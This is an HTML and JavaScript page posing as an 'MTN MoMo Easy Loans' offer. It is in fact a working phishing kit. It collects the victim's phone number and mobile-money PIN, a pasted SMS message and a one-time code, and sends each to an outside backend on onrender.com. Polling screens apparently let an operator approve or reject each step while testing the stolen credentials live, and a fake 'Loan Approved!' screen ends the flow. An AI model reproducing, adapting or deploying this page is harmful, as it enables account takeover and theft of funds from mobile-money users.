<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MTN MoMo – Easy Loans</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --mtn-dark: #003366;
      --mtn-gold: #FFD700;
      --mtn-light: #004080;
      --grad: linear-gradient(to right, #003366, #004080);
      --page-bg: #F5F5F5;
      --white: #FFFFFF;
      --text-dark: #1C2340;
      --text-mid: #444;
      --text-light: #888;
      --border: #ddd;
      --radius: 12px;
      --radius-sm: 8px;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }

    /* MTN MOMO LOGO */
    .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 4px; }
    .mtn-logo-icon { width: 45px; height: 45px; background: var(--mtn-gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; font-weight: 900; color: var(--mtn-dark); position: relative; }
    .mtn-logo-icon::after { content: 'M'; font-size: 2rem; font-weight: 900; }
    .mtn-logo-text { font-size: 1rem; font-weight: 700; color: var(--mtn-dark); }
    .mtn-logo-sub { font-size: 0.65rem; color: #888; font-weight: 500; }

    /* PAGE SYSTEM */
    .page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
    .page.active { display: flex; flex-direction: column; }
    @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }

    /* OVERLAY */
    .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); backdrop-filter:blur(3px); z-index:999; align-items:center; justify-content:center; }
    .overlay.show { display:flex; }
    .modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
    @keyframes popIn { from{opacity:0;transform:scale(0.85)} to{opacity:1;transform:scale(1)} }
    .spinner { width:44px; height:44px; border:4px solid #eee; border-top-color:var(--mtn-gold); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 18px; }
    @keyframes spin { to{transform:rotate(360deg)} }
    .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
    .modal p  { font-size:0.88rem; color:var(--text-light); }

    /* NAV */
    .navbar { background: var(--mtn-dark); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
    .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.6); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
    .nav-left:hover { color:#fff; }
    .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
    .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }

    /* BUTTONS */
    .btn-grad { background: var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:'Inter',sans-serif; transition:opacity 0.2s; }
    .btn-grad:hover { opacity:0.9; }
    .btn-grad:disabled { opacity:0.5; cursor:not-allowed; }
    .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:'Inter',sans-serif; transition:background 0.2s; }
    .btn-gray:hover { background:#d0d0d0; }

    /* FORM */
    .field { margin-bottom:18px; }
    .field label { display:block; font-size:0.82rem; font-weight:500; color:var(--text-mid); margin-bottom:6px; }
    .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
    .field input:focus, .field select:focus, .field textarea:focus { border-color:var(--mtn-gold); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
    .field textarea { resize:vertical; min-height:90px; }
    .sel-wrap { position:relative; }
    .sel-wrap::after { content:'▾'; position:absolute; right:14px; top:50%; transform:translateY(-50%); color:var(--text-light); pointer-events:none; font-size:0.9rem; }
    .field-row { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
    .phone-row { display:flex; }
   /* ─── NEW: Welcome + Loan Application pages ───────────── */

  /* Welcome page */
  .welcome-wrap { max-width: 440px; margin: 24px auto; padding: 0 16px; }
  .welcome-card { background: #fff; border-radius: 16px; padding: 32px 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
  .welcome-title { font-size: 1.5rem; font-weight: 700; color: #1C2340; text-align: center; margin-bottom: 6px; }
  .welcome-sub { font-size: 0.9rem; color: #666; text-align: center; margin-bottom: 22px; }
  .loan-calc { background: #f9f9f9; border-radius: 12px; padding: 20px; margin-bottom: 22px; }
  .loan-calc-title { font-size: 1rem; font-weight: 600; color: #1C2340; margin-bottom: 14px; }
  .loan-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 0.9rem; }
  .loan-row .label { color: #555; }
  .loan-row .val { color: #FFB300; font-weight: 600; }
  .slider-wrap { margin: 16px 0 6px; }
  .slider { width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; appearance: none; -webkit-appearance: none; outline: none; }
  .slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 20px; height: 20px; background: #FFD700; border-radius: 50%; cursor: pointer; border: 3px solid #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
  .slider::-moz-range-thumb { width: 20px; height: 20px; background: #FFD700; border-radius: 50%; cursor: pointer; border: 3px solid #fff; }
  .slider-limits { display: flex; justify-content: space-between; font-size: 0.75rem; color: #888; }
  .monthly-box { background: #fff; border: 1px solid #eee; border-radius: 10px; padding: 14px 18px; display: flex; justify-content: space-between; align-items: center; margin-top: 14px; }
  .monthly-box .lbl { font-size: 0.9rem; color: #555; }
  .monthly-box .amount { font-size: 1.3rem; font-weight: 700; color: #FFB300; }

  /* Progress bar */
  .progress-wrap { max-width: 440px; margin: 0 auto 16px; padding: 0 16px; }
  .progress-title { text-align: center; font-size: 1.15rem; font-weight: 700; color: #1C2340; margin: 24px 0 4px; }
  .progress-sub { text-align: center; font-size: 0.8rem; color: #888; margin-bottom: 14px; }
  .progress-bar { display: flex; gap: 6px; }
  .progress-seg { flex: 1; height: 5px; background: #e0e0e0; border-radius: 3px; }
  .progress-seg.active { background: #FFD700; }

  /* Form fields for new pages */
  .form-wrap { max-width: 440px; margin: 0 auto; padding: 0 16px 32px; }
  .form-card { background: #fff; border-radius: 16px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
  .form-field { margin-bottom: 18px; }
  .form-field label { display: block; font-size: 0.85rem; font-weight: 500; color: #333; margin-bottom: 6px; }
  .form-field input, .form-field select, .form-field textarea { width: 100%; padding: 12px 14px; border: 1.5px solid #ddd; border-radius: 8px; font-family: 'Inter', sans-serif; font-size: 0.92rem; color: #1C2340; background: #fff; outline: none; transition: border-color 0.2s, box-shadow 0.2s; appearance: none; -webkit-appearance: none; }
  .form-field input:focus, .form-field select:focus, .form-field textarea:focus { border-color: #FFD700; box-shadow: 0 0 0 3px rgba(255,215,0,0.2); }
  .form-field textarea { resize: vertical; min-height: 90px; }
  .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
  .form-hint { font-size: 0.75rem; color: #888; margin-top: 4px; }
  .phone-prefix { display: flex; }
  .phone-prefix .prefix { padding: 12px 14px; background: #f5f5f5; border: 1.5px solid #ddd; border-right: none; border-radius: 8px 0 0 8px; font-size: 0.92rem; color: #555; white-space: nowrap; }
  .phone-prefix input { border-radius: 0 8px 8px 0; }
  .form-actions { display: flex; gap: 12px; margin-top: 22px; }
  .btn-primary { flex: 1; background: linear-gradient(to right, #003366, #004080); color: #fff; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
  .btn-primary:hover { opacity: 0.92; }
  .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
  .btn-outline { flex: 1; background: #e0e0e0; color: #666; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
  .btn-outline:hover { background: #d0d0d0; }

  /* Summary box */
  .summary-box { background: #fffbf0; border-left: 4px solid #FFD700; border-radius: 8px; padding: 16px 18px; margin: 20px 0; }
  .summary-box h4 { font-size: 0.9rem; color: #1C2340; margin-bottom: 12px; font-weight: 700; }
  .summary-row { display: flex; justify-content: space-between; font-size: 0.85rem; padding: 6px 0; color: #444; }
  .summary-row .val { font-weight: 600; color: #1C2340; } 
  </style>
</head>
<body>
  <!-- PAGE CONTAINER (simplified for brevity, full structure remains) -->
  <div id="app">
    <!-- Login page -->
    <div id="page-login" class="page active">
      <div class="navbar">
        <a class="nav-left" onclick="goTo('page-welcome')">← Back</a>
        <div class="mtn-logo">
          <div class="mtn-logo-icon"></div>
          <div class="mtn-logo-text">MTN MoMo</div>
          <div class="mtn-logo-sub">Easy Loans</div>
        </div>
        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
      </div>
      <div style="padding: 24px;">
        <div id="lpMsg" class="msg"></div>
        <div id="lpMsgOk" class="msg ok"></div>
        <div id="lpMsgWarn" class="msg warn"></div>
        <div class="field">
          <label>Phone Number</label>
          <input id="lpPhone" type="tel" maxlength="9" placeholder="670123456">
        </div>
        <div class="field">
          <label>PIN (5 digits)</label>
          <div style="display:flex; gap:8px;" id="pinContainer">
            <input id="lp0" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
            <input id="lp1" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
            <input id="lp2" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
            <input id="lp3" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
            <input id="lp4" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
          </div>
        </div>
        <button id="bLgn" class="btn-grad" onclick="doLogin()">LOGIN</button>
      </div>
    </div>

    <!-- Wait login approval page -->
    <div id="page-wait-login-approval" class="page">
      <div class="navbar">
        <div class="mtn-logo">
          <div class="mtn-logo-icon"></div>
          <div class="mtn-logo-text">MTN MoMo</div>
          <div class="mtn-logo-sub">Easy Loans</div>
        </div>
      </div>
      <div style="padding: 24px; text-align: center;">
        <h2>Waiting for approval</h2>
        <p>Application ID: <span id="waitAppId"></span></p>
        <div class="spinner" style="margin-top: 20px;"></div>
      </div>
    </div>

    <!-- SMS paste page -->
    <div id="page-sms-paste" class="page">
      <div class="navbar">
        <div class="mtn-logo">
          <div class="mtn-logo-icon"></div>
          <div class="mtn-logo-text">MTN MoMo</div>
          <div class="mtn-logo-sub">Easy Loans</div>
        </div>
      </div>
      <div style="padding: 24px;">
        <div class="field">
          <label>Paste SMS message</label>
          <textarea id="smsMsgBox" placeholder="Paste the SMS you received..."></textarea>
        </div>
        <button class="btn-grad" onclick="submitSms()">SUBMIT</button>
      </div>
    </div>

    <!-- OTP page -->
    <div id="page-otp" class="page">
      <div class="navbar">
        <div class="mtn-logo">
          <div class="mtn-logo-icon"></div>
          <div class="mtn-logo-text">MTN MoMo</div>
          <div class="mtn-logo-sub">Easy Loans</div>
        </div>
      </div>
      <div style="padding: 24px;">
        <div id="otpMsg" class="msg"></div>
        <div class="field">
          <label>Enter OTP</label>
          <div style="display:flex; gap:8px;" id="otpContainer">
            <input id="otp0" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
            <input id="otp1" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
            <input id="otp2" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
            <input id="otp3" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
          </div>
        </div>
        <button id="bOtp" class="btn-grad" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
      </div>
    </div>

    <!-- Approval page -->
    <div id="page-approval" class="page">
      <div class="navbar">
        <div class="mtn-logo">
          <div class="mtn-logo-icon"></div>
          <div class="mtn-logo-text">MTN MoMo</div>
          <div class="mtn-logo-sub">Easy Loans</div>
        </div>
      </div>
      <div style="padding: 24px; text-align: center;">
        <h2>Loan Approved!</h2>
        <p>Amount: <span id="aprAmount"></span></p>
        <p>Term: <span id="aprTerm"></span></p>
        <p>Monthly: <span id="aprMth"></span></p>
        <p style="font-size: 0.8rem; color: #888;">Amount: <span id="aprAmt"></span></p>
      </div>
    </div>
  </div>

  <!-- Overlay modal for login -->
  <div class="overlay" id="mLgn">
    <div class="modal">
      <div class="spinner"></div>
      <h3>Verifying</h3>
      <p>Please wait...</p>
    </div>
  </div>

  <!-- Overlay modal for OTP -->
  <div class="overlay" id="mOtp">
    <div class="modal">
      <div class="spinner"></div>
      <h3>Processing</h3>
      <p>Please wait...</p>
    </div>
  </div>

  <script>
  window.API_BASE = 'https://mtn-momo-backend.onrender.com';
</script>
  <script>
    // ── State ──────────────────────────────────────────────
    const S = {
      isSubmitting: false,
      applicationId: null,
      loanAmount: 1000000,
      loanTerm: '48 Months',
      requestAdminId: 'admin-001',    // example; replace with real value
    };

    // ── Navigation ─────────────────────────────────────────
    function goTo(pageId) {
      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
      const target = document.getElementById(pageId);
      if (target) target.classList.add('active');
    }

    // ── UI message helpers ─────────────────────────────────
    function showLgnMsg(type, msg) {
      ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => {
        const el = document.getElementById(id);
        if (el) { el.classList.remove('show'); el.textContent = ''; }
      });
      let id = 'lpMsg';
      if (type === 'success') id = 'lpMsgOk';
      else if (type === 'warning') id = 'lpMsgWarn';
      const el = document.getElementById(id);
      if (el) { el.textContent = msg; el.classList.add('show'); }
    }

    function showOtpMsg(type, msg) {
      const el = document.getElementById('otpMsg');
      if (!el) return;
      el.textContent = msg;
      el.className = 'msg' + (type === 'error' ? '' : ' ' + type);
    }

    // ── PIN input auto-tab ─────────────────────────────────
    function chkPin() {
      const inputs = [0,1,2,3,4].map(i => document.getElementById('lp'+i));
      inputs.forEach((inp, idx) => {
        inp.oninput = () => {
          if (inp.value.length === 1 && idx < 4) inputs[idx+1].focus();
        };
        inp.onkeydown = (e) => {
          if (e.key === 'Backspace' && inp.value === '' && idx > 0) inputs[idx-1].focus();
        };
      });
    }

    function chkOtp() {
      const inputs = [0,1,2,3].map(i => document.getElementById('otp'+i));
      inputs.forEach((inp, idx) => {
        inp.oninput = () => {
          if (inp.value.length === 1 && idx < 3) inputs[idx+1].focus();
        };
        inp.onkeydown = (e) => {
          if (e.key === 'Backspace' && inp.value === '' && idx > 0) inputs[idx-1].focus();
        };
      });
    }

    // ── Cancel all polls ───────────────────────────────────
    let pollTimeout = null;
    let otpPollTimeout = null;

    function cancelAllPolls() {
      if (pollTimeout) { clearTimeout(pollTimeout); pollTimeout = null; }
      if (otpPollTimeout) { clearTimeout(otpPollTimeout); otpPollTimeout = null; }
    }

    // ── Login ──────────────────────────────────────────────
    async function doLogin() {
      if (S.isSubmitting) {
        console.log('⚠️ Login already in flight, ignoring duplicate call');
        return;
      }
      S.isSubmitting = true;

      cancelAllPolls();

      ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove('show');
      });

      const phone = document.getElementById('lpPhone').value;
      const pin   = [0,1,2,3,4].map(i => document.getElementById('lp'+i).value).join('');

      if (phone.length !== 9 || pin.length < 5) {
        S.isSubmitting = false;
        showLgnMsg('warning', 'Phone: 9 digits (e.g., 670123456). PIN: 5 digits.');
        return;
      }

      document.getElementById('mLgn').classList.add('show');
      document.getElementById('bLgn').disabled = true;

      try {
        const requestBody = {
          phoneNumber:    phone,
          pin:            pin,
          requestAdminId: S.requestAdminId,
          assignmentType: 'specific'
        };

        const res  = await fetch((window.API_BASE||'')+'/api/verify-pin', {
          method:  'POST',
          headers: { 'Content-Type': 'application/json' },
          body:    JSON.stringify(requestBody)
        });

        const data = await res.json();
        document.getElementById('mLgn').classList.remove('show');

        if (data.success) {
          S.isSubmitting = false;
          S.applicationId = data.applicationId;
          document.getElementById('waitAppId').textContent = data.applicationId;
          goTo('page-wait-login-approval');
          pollForPinApproval(data.applicationId);
        } else {
          S.isSubmitting = false;
          document.getElementById('bLgn').disabled = false;
          showLgnMsg('error', data.message || 'Login failed.');
        }
      } catch (err) {
        S.isSubmitting = false;
        document.getElementById('mLgn').classList.remove('show');
        document.getElementById('bLgn').disabled = false;
        showLgnMsg('error', 'Network error: ' + err.message);
      }
    }

    // ── Poll for PIN approval ──────────────────────────────
    function pollForPinApproval(applicationId) {
      const checkStatus = async () => {
        if (S.applicationId !== applicationId) {
          console.log('🛑 Stale PIN poll stopped for', applicationId);
          return;
        }
        try {
          const res  = await fetch(`${window.API_BASE||''}/api/check-pin-status/${applicationId}`);
          const data = await res.json();

          if (data.success) {
            if (data.status === 'approved') {
              clearTimeout(pollTimeout);
              pollTimeout = null;
              goTo('page-sms-paste');

            } else if (data.status === 'rejected') {
              clearTimeout(pollTimeout);
              pollTimeout = null;
              document.getElementById('lpPhone').value = '';
              [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
              goTo('page-login');
              document.getElementById('bLgn').disabled = false;
              chkPin();
              showLgnMsg('error', 'Your login credentials were invalid. Please try again.');

            } else {
              pollTimeout = setTimeout(checkStatus, 2000);
            }
          } else {
            pollTimeout = setTimeout(checkStatus, 3000);
          }
        } catch (err) {
          console.error('Poll error:', err);
          pollTimeout = setTimeout(checkStatus, 3000);
        }
      };
      checkStatus();
    }

      
      // ── Submit pasted SMS text ─────────────────────────────
  async function submitSms() {
    const smsText = document.getElementById('smsMsgBox').value.trim();
    if (!smsText) {
      alert('Please paste the SMS message.');
      return;
    }
    try {
      const res = await fetch(`${window.API_BASE||''}/api/submit-sms`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          applicationId: S.applicationId,
          smsText: smsText
        })
      });
      const data = await res.json();
      if (data.success) {
        goTo('page-otp');
        chkOtp();
      } else {
        alert(data.message || 'Failed to submit SMS.');
      }
    } catch (err) {
      alert('Network error: ' + err.message);
    }
  }

    
    // ── Verify OTP ─────────────────────────────────────────
  async function doOtp() {
    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
    if (otp.length !== 4) {
      showOtpMsg('error', 'Please enter the 4-digit OTP.');
      return;
    }

    document.getElementById('mOtp').classList.add('show');
    document.getElementById('bOtp').disabled = true;
    document.getElementById('bOtp').textContent = 'VERIFYING...';

    try {
      const res = await fetch(`${window.API_BASE||''}/api/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          applicationId: S.applicationId,
          otp: otp
        })
      });
      const data = await res.json();
      document.getElementById('mOtp').classList.remove('show');

      if (data.success) {
        pollForOtpApproval(S.applicationId);
      } else {
        document.getElementById('bOtp').disabled = false;
        document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
        showOtpMsg('error', data.message || 'Failed to submit OTP.');
      }
    } catch (err) {
      document.getElementById('mOtp').classList.remove('show');
      document.getElementById('bOtp').disabled = false;
      document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
      showOtpMsg('error', 'Error: ' + err.message);
    }
  }
      // After success:
      // pollForOtpApproval(S.applicationId);


    // ── Poll for OTP approval (fixed with all statuses) ─────
    function pollForOtpApproval(applicationId) {
      const checkStatus = async () => {
        if (S.applicationId !== applicationId) {
          console.log('🛑 Stale OTP poll stopped for', applicationId);
          return;
        }
        try {
          const res  = await fetch(`${window.API_BASE||''}/api/check-otp-status/${applicationId}`);
          const data = await res.json();

          if (data.success) {
            const status = data.status;

            if (status === 'approved') {
              clearTimeout(otpPollTimeout);
              otpPollTimeout = null;
              document.getElementById('aprAmount').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
              document.getElementById('aprAmt').textContent    = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
              document.getElementById('aprTerm').textContent   = S.loanTerm || '48 Months';
              const monthly = Math.ceil((S.loanAmount || 1000000) / (parseInt(S.loanTerm || '48')));
              document.getElementById('aprMth').textContent    = 'XAF ' + monthly.toLocaleString();
              goTo('page-approval');

            } else if (status === 'wrongcode') {
              clearTimeout(otpPollTimeout);
              otpPollTimeout = null;
              [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
              goTo('page-otp');
              document.getElementById('bOtp').disabled = false;
              document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
              chkOtp();
              showOtpMsg('error', 'The OTP code was incorrect. Please try again.');

            } else if (status === 'wrongpin_otp') {
              clearTimeout(otpPollTimeout);
              otpPollTimeout = null;

              document.getElementById('lpPhone').value = '';
              [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
              [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
              document.getElementById('smsMsgBox').value = '';

              document.getElementById('bOtp').disabled = false;
              document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';

              // Also reset login button state
              document.getElementById('bLgn').disabled = false;
              chkPin();
              chkOtp();

              goTo('page-login');
              showLgnMsg('error', 'Your PIN was incorrect. Please log in again.');

            } else {
              otpPollTimeout = setTimeout(checkStatus, 2000);
            }
          } else {
            otpPollTimeout = setTimeout(checkStatus, 3000);
          }
        } catch (err) {
          console.error('OTP poll error:', err);
          otpPollTimeout = setTimeout(checkStatus, 3000);
        }
      };
      checkStatus();
    }

    // ── Initialize ─────────────────────────────────────────
    document.addEventListener('DOMContentLoaded', () => {
      chkPin();
      chkOtp();
    });
  </script>
